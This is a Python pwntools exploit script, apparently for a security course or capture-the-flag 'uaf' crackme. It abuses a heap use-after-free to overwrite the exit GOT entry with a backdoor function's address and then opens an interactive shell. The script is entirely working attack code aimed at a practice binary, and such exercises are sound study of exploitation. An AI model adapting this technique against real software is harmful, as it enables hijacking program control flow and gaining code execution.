import pwn
from pwnlib.util.packing import p64, u64
import code


pwn.context(arch='amd64', os='linux', log_level='INFO')

binary = pwn.ELF('./crackme/02_uaf/uaf')

got_exit = binary.got['exit']
addr_backdoor = binary.sym['backdoor']

# conn = pwn.remote('47.99.80.189', 10030)
# conn.recvuntil('ID:\n')
# conn.sendline('3180103012')

conn = pwn.process('crackme/02_uaf/uaf')


def add_ddl_conn(time: str = 'time', content: str = 'content'):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('1')
    conn.recvuntil('please input the ddl time\n')
    conn.sendline(time)
    conn.recvuntil('please input the ddl content\n')
    conn.sendline(content)


def finish_ddl_conn(index: int):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('2')
    conn.recvuntil('please input the ddl index\n')
    conn.sendline(str(index))


def edit_ddl_conn(index: int, time: str = 'time', content: str = 'content'):
    conn.recvuntil('Your chocie:\n')
    conn.sendline('4')
    conn.recvuntil('please input the ddl index\n')
    conn.sendline(str(index))
    conn.recvuntil('please input the new ddl time\n')
    conn.sendline(time)
    conn.recvuntil('please input the new ddl content\n')
    conn.sendline(content)


def exit_ddl_conn():
    conn.recvuntil('Your chocie:\n')
    conn.sendline('5')
    conn.recvuntil('see you next time!\n')


add_ddl_conn()  # A
add_ddl_conn()  # B
add_ddl_conn()  # C


finish_ddl_conn(1)
finish_ddl_conn(2)


edit_ddl_conn(2, p64(got_exit))


add_ddl_conn()                    # D
add_ddl_conn(p64(addr_backdoor))  # E


exit_ddl_conn()

conn.interactive()
